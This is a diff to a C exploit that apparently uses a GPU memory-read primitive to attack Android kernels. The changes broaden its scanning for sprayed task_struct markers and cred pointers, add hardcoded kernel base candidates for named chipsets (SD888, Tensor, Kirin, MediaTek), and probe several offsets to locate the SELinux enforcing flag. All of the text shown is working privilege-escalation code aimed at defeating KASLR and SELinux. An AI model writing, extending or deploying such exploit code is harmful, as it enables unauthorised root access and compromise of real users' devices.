@@ -389,9 +389,14 @@ int main(int argc, char **argv) {
                 if (read_gpu_page(va, buf) == 0) {
                     int found_sig = 0;
                     int found_off = -1;
-                    // 1. task_struct comm = "KETO0422" (8 bytes) — full marker
+                    // 1a. task_struct comm = "KETO0422" (our spray) — full 8-byte marker
                     void *p = memmem(buf, PAGE_SIZE, "KETO0422", 8);
                     if (p) { found_sig = 1; found_off = (int)((uint8_t*)p - buf); }
+                    // 1b. task_struct comm = "KET00422" (v6.c spray) — note the missing 0
+                    if (!found_sig) {
+                        p = memmem(buf, PAGE_SIZE, "KET00422", 8);
+                        if (p) { found_sig = 1; found_off = (int)((uint8_t*)p - buf); }
+                    }
                     // 2. System app
                     if (!found_sig) {
                         p = memmem(buf, PAGE_SIZE, "com.android.", 11);
@@ -408,30 +413,43 @@ int main(int argc, char **argv) {
                         if (p) { found_sig = 4; found_off = (int)((uint8_t*)p - buf); }
                     }
                     // 5. cred pointer — kernel pointer (0xffffff...) at expected task_struct offsets
+                    // v6.c uses MARKER_OFF=0xfd8, so the cred pointer
+                    // might be anywhere in 0x700..0x1100. We scan a
+                    // wider range and look for kernel pointers with
+                    // printable-ASCII comm nearby.
                     if (!found_sig) {
-                        for (int off = 0x700; off < 0x800 && off < PAGE_SIZE - 8; off += 8) {
+                        static const int comm_offs[] = {
+                            0x718, 0xfd8,
+                            0x100, 0x200, 0x300, 0x400, 0x500, 0x600,
+                            0x700, 0x800, 0x900, 0xa00, 0xb00, 0xc00,
+                            0xd00, 0xe00, 0xf00, 0x1000
+                        };
+                        for (int off = 0x700; off < 0x1100 && off < PAGE_SIZE - 8; off += 8) {
                             uint64_t v;
                             memcpy(&v, buf + off, 8);
-                            // Kernel pointers on AArch64: 0xffffff80..0xffffffcf
-                            // AND aligned to 8 bytes (cred/real_cred are pointer-aligned)
                             if ((v >> 32) >= 0xffffff80 && (v >> 40) <= 0xffffffcf) {
-                                // Additional filter: must be non-null and not 0xffffffffffffffff
                                 if (v != 0 && v != 0xffffffffffffffffULL) {
-                                    // Check if comm area near 0x718 has a string (printable ASCII)
-                                    if (off >= 0x60 && off < 0x780) {
+                                    int has_comm = 0;
+                                    for (size_t ci = 0; ci < sizeof(comm_offs) / sizeof(comm_offs[0]); ci++) {
+                                        int comm_off = comm_offs[ci];
+                                        if (comm_off + 16 > PAGE_SIZE) continue;
                                         int printable = 1;
-                                        for (int k = (int)(off - 0x718); k >= 0 && k < 16; k++) {
-                                            uint8_t c = buf[k];
+                                        for (int k = 0; k < 16; k++) {
+                                            uint8_t c = buf[comm_off + k];
                                             if (c != 0 && (c < 0x20 || c > 0x7e)) {
                                                 printable = 0;
                                                 break;
                                             }
                                         }
-                                        if (printable || (off - 0x718) < 16) {
-                                            found_sig = 6;
-                                            found_off = off;
+                                        if (printable && buf[comm_off] != 0) {
+                                            has_comm = 1;
                                             break;
                                         }
+                                    }
+                                    if (has_comm) {
+                                        found_sig = 6;
+                                        found_off = off;
+                                        break;
                                     }
                                 }
                             }
@@ -681,7 +699,10 @@ int main(int argc, char **argv) {
             }
             fflush(stdout);
         } else if (strncmp(line, "kbase", 5) == 0) {
-            // Auto-find kernel base by trying known addresses
+            // Auto-find kernel base by trying known addresses.
+            // Includes 0xffffff8c… (SD888/Asus ROG 5S), 0xffffffaf…
+            // (Tensor/Exynos), 0xffffffb0… (Kirin), 0xffffff95…
+            // (MediaTek), etc.
             uint64_t bases[] = {
                 0xffffffc000000000ULL, 0xffffffc010000000ULL,
                 0xffffffc020000000ULL, 0xffffffc030000000ULL,
@@ -689,7 +710,15 @@ int main(int argc, char **argv) {
                 0xffffffc008200000ULL, 0xffffffb000000000ULL,
                 0xffffffa000000000ULL, 0xffffffaf00000000ULL,
                 0xffffffaf20000000ULL, 0xffffff9550000000ULL,
-                0xffffff94d0000000ULL, 0xffffff8e70000000ULL
+                0xffffff94d0000000ULL, 0xffffff8e70000000ULL,
+                // From user screenshot — 0xffffff8cc1000000 (SD888)
+                0xffffff8c00000000ULL, 0xffffff8c10000000ULL,
+                0xffffff8cc0000000ULL, 0xffffff8cc1000000ULL,
+                0xffffff8cd0000000ULL, 0xffffff8c80000000ULL,
+                0xffffff8d00000000ULL,
+                // More AArch64 ranges
+                0xffffffaf10000000ULL, 0xffffffb010000000ULL,
+                0xffffffb020000000ULL,
             };
             uint8_t page[PAGE_SIZE];
             int found = 0;
@@ -703,19 +732,31 @@ int main(int argc, char **argv) {
                         break;
                     }
                 }
-                // Check SELinux enforcing at known offset too
-                uint32_t sel = 0;
-                uint64_t sel_va = bases[i] + 0x02caa000ULL;
-                if (read_gpu_page(sel_va, page) == 0) {
-                    memcpy(&sel, page, 4);
-                    if (sel <= 1) {
-                        printf("KBASE:%lx\n", (unsigned long)bases[i]);
-                        printf("SELINUX:%lx\n", (unsigned long)sel_va);
-                        fflush(stdout);
-                        found = 1;
-                        break;
+                // Also check selinux at multiple offsets — accept ANY
+                // selinux candidate that looks valid (sel<=1 + nonzero page)
+                uint64_t sel_offs[] = {
+                    0x02caa000ULL, 0x2f74ce8ULL, 0x2f84ce8ULL,
+                    0x32aace8ULL, 0x3709ce8ULL, 0x3b3ace8ULL,
+                };
+                for (size_t j = 0; j < sizeof(sel_offs) / sizeof(sel_offs[0]); j++) {
+                    uint32_t sel = 0;
+                    uint64_t sel_va = bases[i] + sel_offs[j];
+                    if (read_gpu_page(sel_va, page) == 0) {
+                        memcpy(&sel, page, 4);
+                        if (sel <= 1) {
+                            int nz = 0;
+                            for (int k = 0; k < 128; k++) if (page[k] != 0) nz++;
+                            if (nz >= 32) {
+                                printf("KBASE:%lx\n", (unsigned long)bases[i]);
+                                printf("SELINUX:%lx\n", (unsigned long)sel_va);
+                                fflush(stdout);
+                                found = 1;
+                                break;
+                            }
+                        }
                     }
                 }
+                if (found) break;
             }
             if (!found) printf("KBASE_FAILED\n");
         } else if (strncmp(line, "quit", 4) == 0) {
